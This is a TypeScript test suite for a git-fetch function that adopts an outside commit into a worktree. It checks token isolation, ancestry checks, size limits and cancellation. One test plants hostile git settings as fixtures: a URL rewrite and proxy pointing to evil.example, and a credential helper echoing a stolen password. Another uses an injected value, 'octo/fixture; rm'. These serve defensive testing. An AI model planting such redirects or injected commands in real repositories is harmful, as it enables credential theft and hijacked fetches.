import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { randomBytes } from "node:crypto";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test, type TestContext } from "node:test";
import { forgeCommitGraphParent } from "../fixtures/forged-commit-graph.js";
import { adoptOutsideHead } from "../../src/standalone/git-fetch.js";

const token = "ghp_fetch_credential_0123456789abcdef";
const branch = "ensemble/abcd1234-task";
const realGit = spawnSync("which", ["git"], { encoding: "utf8" }).stdout.trim();

function git(cwd: string, ...args: string[]): string {
  return execFileSync(
    "git",
    ["-c", "user.name=T", "-c", "user.email=t@example.com", ...args],
    {
      cwd,
      encoding: "utf8",
      env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null" },
    },
  ).trim();
}

/**
 * A source with a base commit, a task worktree on a local commit, and a bare `remote` that outside
 * writers push to. `outside` commits to a clone of the remote and publishes the result there.
 */
function repository(t: TestContext, prefix = "ensemble-git-fetch-") {
  const root = mkdtempSync(join(tmpdir(), prefix));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const source = join(root, "source");
  mkdirSync(source);
  git(source, "init", "-q", "-b", "main");
  writeFileSync(join(source, "a.txt"), "a\n");
  git(source, "add", ".");
  git(source, "commit", "-q", "-m", "base");
  const base = git(source, "rev-parse", "HEAD");
  const workspace = join(root, "workspace");
  git(source, "worktree", "add", "-q", "--detach", workspace, base);
  writeFileSync(join(workspace, "mine.txt"), "mine\n");
  git(workspace, "add", ".");
  git(workspace, "commit", "-q", "-m", "mine");
  const mine = git(workspace, "rev-parse", "HEAD");
  const remote = join(root, "remote.git");
  git(root, "clone", "-q", "--bare", source, remote);
  git(remote, "config", "uploadpack.allowAnySHA1InWant", "true");
  const outsideClone = join(root, "outside");
  git(root, "clone", "-q", remote, outsideClone);
  let counter = 0;
  const commitOutside = (from = base, bytes = 0) => {
    git(outsideClone, "checkout", "-q", "--detach", from);
    writeFileSync(
      join(outsideClone, `outside-${++counter}.txt`),
      `${counter}\n`,
    );
    // Incompressible, so the pack is about this size.
    if (bytes > 0)
      writeFileSync(
        join(outsideClone, `outside-${counter}.bin`),
        randomBytes(bytes),
      );
    git(outsideClone, "add", ".");
    git(outsideClone, "commit", "-q", "-m", `outside ${counter}`);
    const sha = git(outsideClone, "rev-parse", "HEAD");
    git(outsideClone, "push", "-q", remote, `${sha}:refs/heads/o${counter}`);
    return sha;
  };
  return { root, source, workspace, base, mine, remote, commitOutside };
}

/**
 * A `git` shim: everything but `fetch` runs the real Git. A fetch records its argv, selected
 * environment and the effective configuration, then runs the real fetch against a local bare
 * repository in place of github.com (with the transport restrictions replaced by a file allowance).
 */
function shim(
  t: TestContext,
  remote: string,
  behaviour: { sleep?: boolean; exit?: number; grow?: number } = {},
) {
  const directory = mkdtempSync(join(tmpdir(), "ensemble-git-fetch-shim-"));
  t.after(() => rmSync(directory, { recursive: true, force: true }));
  const executable = join(directory, "git");
  const record = join(directory, "record.json");
  const started = join(directory, "started");
  const pidFile = join(directory, "pid");
  writeFileSync(
    executable,
    `#!${process.execPath}
const { spawnSync } = require("node:child_process");
const { writeFileSync } = require("node:fs");
const args = process.argv.slice(2);
if (!args.includes("fetch")) {
  const r = spawnSync(${JSON.stringify(realGit)}, args, { stdio: "inherit" });
  process.exit(r.status ?? 1);
}
const real = (a, env) => spawnSync(${JSON.stringify(realGit)}, a, { encoding: "utf8", env: env ?? process.env });
const at = args.indexOf("fetch");
writeFileSync(${JSON.stringify(record)}, JSON.stringify({
  args,
  cwd: process.cwd(),
  env: Object.fromEntries(Object.entries(process.env).filter(([k]) => /^(GIT_|ENSEMBLE_|HOME$)/.test(k))),
  config: real([...args.slice(0, at), "config", "--list", "--show-origin"]).stdout,
}));
writeFileSync(${JSON.stringify(started)}, "1");
${
  behaviour.sleep || behaviour.grow
    ? `${
        behaviour.grow
          ? `const { mkdirSync } = require("node:fs");
mkdirSync(process.env.GIT_DIR + "/objects/pack", { recursive: true });
writeFileSync(${JSON.stringify(pidFile)}, String(process.pid));
writeFileSync(process.env.GIT_DIR + "/objects/pack/tmp_pack_fake", Buffer.alloc(${behaviour.grow}));
`
          : ""
      }setTimeout(() => {}, 60000);`
    : behaviour.exit
      ? `process.exit(${behaviour.exit});`
      : `
const kept = [];
for (let i = 0; i < at; i += 2) {
  // Only \`-c key=value\` pairs precede fetch; the transport restrictions give way to a local path.
  if (!/^(protocol|credential)\\./.test(args[i + 1])) kept.push(args[i], args[i + 1]);
}
const rest = args.slice(at).map((a) => a.startsWith("https://github.com/") ? ${JSON.stringify(remote)} : a);
const r = spawnSync(${JSON.stringify(realGit)}, [...kept, "-c", "protocol.file.allow=always", ...rest], { stdio: "inherit", env: { ...process.env, GIT_ALLOW_PROTOCOL: "file" } });
process.exit(r.status ?? 1);
`
}
`,
  );
  chmodSync(executable, 0o755);
  return {
    executable,
    started,
    pid: () => Number(readFileSync(pidFile, "utf8")),
    recorded: () =>
      JSON.parse(readFileSync(record, "utf8")) as {
        args: string[];
        cwd: string;
        env: Record<string, string>;
        config: string;
      },
  };
}

const request = (
  repo: ReturnType<typeof repository>,
  executable: string,
  commitSha: string,
) => ({
  workspacePath: repo.workspace,
  baseCommit: repo.base,
  nameWithOwner: "octo/fixture",
  commitSha,
  branch,
  token,
  executable,
});

function filesContaining(directory: string, needle: string): string[] {
  const found: string[] = [];
  const walk = (dir: string) => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const path = join(dir, entry.name);
      if (entry.isDirectory()) walk(path);
      else if (readFileSync(path).includes(needle)) found.push(path);
    }
  };
  walk(directory);
  return found;
}
const adoptedRef = (repo: ReturnType<typeof repository>) => {
  const read = spawnSync(
    "git",
    ["rev-parse", "--verify", "--quiet", `refs/ensemble/adopted/${branch}`],
    { cwd: repo.workspace, encoding: "utf8" },
  );
  return read.status === 0 ? read.stdout.trim() : null;
};

test("a checkout path containing a colon still adopts through quoted alternates", async (t) => {
  const repo = repository(t, "ensemble-git-fetch-a:b-");
  const outside = repo.commitOutside();
  const fake = shim(t, repo.remote);
  assert.equal(
    await adoptOutsideHead(request(repo, fake.executable, outside)),
    "adopted",
  );
  assert.equal(adoptedRef(repo), outside);
  assert.equal(
    fake.recorded().env.GIT_ALTERNATE_OBJECT_DIRECTORIES,
    JSON.stringify(
      join(git(repo.workspace, "rev-parse", "--git-common-dir"), "objects"),
    ),
  );
});

test("a rebased outside head is adopted into the worktree's objects without touching HEAD, the index or files", async (t) => {
  const repo = repository(t);
  // Descends from the base but not from the local commit: a maintainer's rewrite.
  const outside = repo.commitOutside();
  writeFileSync(join(repo.workspace, "dirty.txt"), "uncommitted\n");
  const head = git(repo.workspace, "rev-parse", "HEAD");
  const status = git(repo.workspace, "status", "--porcelain");
  const fake = shim(t, repo.remote);
  assert.equal(
    await adoptOutsideHead(request(repo, fake.executable, outside)),
    "adopted",
  );
  assert.equal(adoptedRef(repo), outside);
  assert.equal(git(repo.workspace, "cat-file", "-t", outside), "commit");
  assert.equal(git(repo.workspace, "rev-parse", "HEAD"), head);
  assert.equal(git(repo.workspace, "status", "--porcelain"), status);
  assert.equal(
    readFileSync(join(repo.workspace, "dirty.txt"), "utf8"),
    "uncommitted\n",
  );
  assert.equal(
    spawnSync("git", ["merge-base", "--is-ancestor", repo.mine, outside], {
      cwd: repo.workspace,
    }).status,
    1,
    "not a descendant of the local commit",
  );
});

test("a head that does not descend from the base is not adopted", async (t) => {
  const repo = repository(t);
  git(repo.root, "clone", "-q", repo.remote, join(repo.root, "alien"));
  const alien = join(repo.root, "alien");
  git(alien, "checkout", "-q", "--orphan", "alien");
  git(alien, "commit", "-q", "--allow-empty", "-m", "alien");
  const sha = git(alien, "rev-parse", "HEAD");
  git(alien, "push", "-q", repo.remote, `${sha}:refs/heads/alien`);
  const fake = shim(t, repo.remote);
  assert.equal(
    await adoptOutsideHead(request(repo, fake.executable, sha)),
    "not-on-base",
  );
  assert.equal(adoptedRef(repo), null);
});

test("the token reaches only the fetch child's environment, never argv, configuration or files", async (t) => {
  const repo = repository(t);
  const outside = repo.commitOutside();
  const fake = shim(t, repo.remote);
  assert.equal(
    await adoptOutsideHead(request(repo, fake.executable, outside)),
    "adopted",
  );
  const seen = fake.recorded();
  assert.equal(seen.env.ENSEMBLE_PUSH_TOKEN, token);
  assert.equal(
    seen.args.some((a) => a.includes(token)),
    false,
  );
  assert.equal(seen.config.includes(token), false);
  assert.deepEqual(filesContaining(repo.root, token), []);
  assert.equal(existsSync(seen.env.GIT_DIR ?? ""), false, "scratch removed");
  assert.notEqual(seen.cwd, repo.workspace);
  assert.equal(seen.env.GIT_ALLOW_PROTOCOL, "https");
  // Exactly one sha is requested.
  assert.deepEqual(seen.args.slice(-2), [
    "https://github.com/octo/fixture.git",
    `+${outside}:refs/ensemble/adopt`,
  ]);
});

test("repository-local and user configuration and hooks cannot redirect the fetch or its credential", async (t) => {
  const repo = repository(t);
  const outside = repo.commitOutside();
  const home = join(repo.root, "home");
  mkdirSync(home);
  const hostile = [
    '[url "https://evil.example/"]\n\tinsteadOf = https://github.com/\n',
    "[http]\n\tproxy = http://evil.example:3128\n",
    "[credential]\n\thelper = !echo password=stolen\n",
    "[core]\n\talternateRefsCommand = touch /tmp/ensemble-alt-ran\n",
  ].join("");
  writeFileSync(join(home, ".gitconfig"), hostile);
  for (const [key, value] of [
    ["url.https://evil.example/.insteadOf", "https://github.com/"],
    ["http.proxy", "http://evil.example:3128"],
    ["credential.helper", "!echo password=stolen"],
    ["core.alternateRefsCommand", `touch ${join(repo.root, "alt-ran")}`],
  ] as const)
    git(repo.workspace, "config", key, value);
  const hooks = join(repo.root, "hooks");
  mkdirSync(hooks);
  const marker = join(repo.root, "hook-ran");
  writeFileSync(
    join(hooks, "reference-transaction"),
    `#!/bin/sh\ntouch ${marker}\n`,
  );
  chmodSync(join(hooks, "reference-transaction"), 0o755);
  git(repo.workspace, "config", "core.hooksPath", hooks);
  const priorHome = process.env.HOME;
  process.env.HOME = home;
  t.after(() => {
    if (priorHome === undefined) delete process.env.HOME;
    else process.env.HOME = priorHome;
  });
  const fake = shim(t, repo.remote);
  assert.equal(
    await adoptOutsideHead(request(repo, fake.executable, outside)),
    "adopted",
  );
  const config = fake.recorded().config.trim().split("\n");
  assert.deepEqual(
    config.filter((line) => !line.startsWith("command line:")),
    [],
  );
  const joined = config.join("\n");
  assert.match(joined, /protocol\.https\.allow=always/);
  assert.match(joined, /http\.followredirects=false/);
  assert.match(joined, /core\.alternaterefscommand=true/);
  assert.match(joined, /transfer\.fsckobjects=true/);
  assert.equal(joined.includes("evil"), false);
  assert.equal(existsSync(marker), false, "the worktree's hook never ran");
  assert.equal(existsSync(join(repo.root, "alt-ran")), false);
});

test("a forged commit-graph in the worktree cannot make an unrelated head look built on the base", async (t) => {
  const repo = repository(t);
  // An unrelated root commit X that also exists locally, with the worktree's graph forged to name the base as its parent.
  git(repo.workspace, "checkout", "-q", "--orphan", "alien");
  git(repo.workspace, "commit", "-q", "--allow-empty", "-m", "Y");
  git(repo.workspace, "commit", "-q", "--allow-empty", "-m", "X");
  const x = git(repo.workspace, "rev-parse", "HEAD");
  git(repo.workspace, "checkout", "-q", "--detach", repo.mine);
  git(repo.workspace, "branch", "keep-x", x);
  git(repo.workspace, "push", "-q", repo.remote, `${x}:refs/heads/x`);
  git(repo.workspace, "commit-graph", "write", "--reachable");
  const graph = join(
    git(
      repo.workspace,
      "rev-parse",
      "--path-format=absolute",
      "--git-common-dir",
    ),
    "objects/info/commit-graph",
  );
  forgeCommitGraphParent(graph, x, repo.base);
  const fake = shim(t, repo.remote);
  const outcome = await adoptOutsideHead(request(repo, fake.executable, x));
  assert.ok(outcome === "not-on-base" || outcome === "unproved", outcome);
  assert.equal(adoptedRef(repo), null);
});

test("a failed or cancelled fetch imports nothing, and an invalid request never starts Git", async (t) => {
  const repo = repository(t);
  const outside = repo.commitOutside();
  const failing = shim(t, repo.remote, { exit: 128 });
  assert.equal(
    await adoptOutsideHead(request(repo, failing.executable, outside)),
    "fetch-failed",
  );
  const sleeper = shim(t, repo.remote, { sleep: true });
  const controller = new AbortController();
  const pending = adoptOutsideHead({
    ...request(repo, sleeper.executable, outside),
    signal: controller.signal,
  });
  const deadline = Date.now() + 5000;
  while (!existsSync(sleeper.started) && Date.now() < deadline)
    await new Promise<void>((r) => setTimeout(r, 10));
  controller.abort();
  assert.equal(await pending, "fetch-failed");
  assert.equal(adoptedRef(repo), null);

  const never = shim(t, repo.remote);
  for (const bad of [
    { token: "" },
    { branch: "-x" },
    { nameWithOwner: "octo/fixture; rm" },
    { commitSha: "HEAD" },
    { baseCommit: null },
  ])
    assert.equal(
      await adoptOutsideHead({
        ...request(repo, never.executable, outside),
        ...bad,
      }),
      "not-attempted",
    );
  assert.equal(existsSync(never.started), false);
});

test("a fetch within the size bound is adopted", async (t) => {
  const repo = repository(t);
  const outside = repo.commitOutside(repo.base, 200_000);
  const fake = shim(t, repo.remote);
  assert.equal(
    await adoptOutsideHead({
      ...request(repo, fake.executable, outside),
      maxFetchBytes: 1_000_000,
    }),
    "adopted",
  );
  assert.equal(adoptedRef(repo), outside);
});

test("a fetch over the size bound that finishes first is refused after it exits", async (t) => {
  const repo = repository(t);
  const outside = repo.commitOutside(repo.base, 200_000);
  const packs = join(
    git(
      repo.workspace,
      "rev-parse",
      "--path-format=absolute",
      "--git-common-dir",
    ),
    "objects",
    "pack",
  );
  const before = readdirSync(packs);
  const fake = shim(t, repo.remote);
  assert.equal(
    await adoptOutsideHead({
      ...request(repo, fake.executable, outside),
      maxFetchBytes: 50_000,
    }),
    "too-large",
  );
  assert.equal(adoptedRef(repo), null);
  assert.equal(
    existsSync(fake.recorded().env.GIT_DIR ?? ""),
    false,
    "scratch removed",
  );
  assert.deepEqual(readdirSync(packs), before, "nothing imported");
});

test("a fetch that grows past the size bound is stopped", async (t) => {
  const repo = repository(t);
  const outside = repo.commitOutside();
  const fake = shim(t, repo.remote, { grow: 5_000 });
  const started = Date.now();
  assert.equal(
    await adoptOutsideHead({
      ...request(repo, fake.executable, outside),
      maxFetchBytes: 1_000,
    }),
    "too-large",
  );
  assert.ok(
    Date.now() - started < 30_000,
    "stopped well before the sleeper ends",
  );
  assert.throws(() => process.kill(fake.pid(), 0), { code: "ESRCH" });
  assert.equal(
    existsSync(fake.recorded().env.GIT_DIR ?? ""),
    false,
    "scratch removed",
  );
  assert.equal(adoptedRef(repo), null);
});
